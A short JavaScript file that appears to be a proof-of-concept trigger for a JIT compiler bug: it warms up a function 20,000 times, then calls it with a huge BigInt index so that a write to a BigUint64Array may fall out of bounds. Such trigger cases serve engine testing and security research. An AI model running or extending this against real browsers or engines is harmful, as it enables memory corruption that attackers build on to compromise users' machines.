function vuln(is_trigger) {
    const arr = new BigUint64Array(1);
    let idx = 1n;
    if (is_trigger) {
        idx = 0x100000000n;
    }
    for (let i = 0; i < 1; i++) {
        idx = idx + 1n;
    }
    arr[idx] = 1337n;
}

for (let i = 0; i < 20000; i++) {
    vuln(false);
}

vuln(true);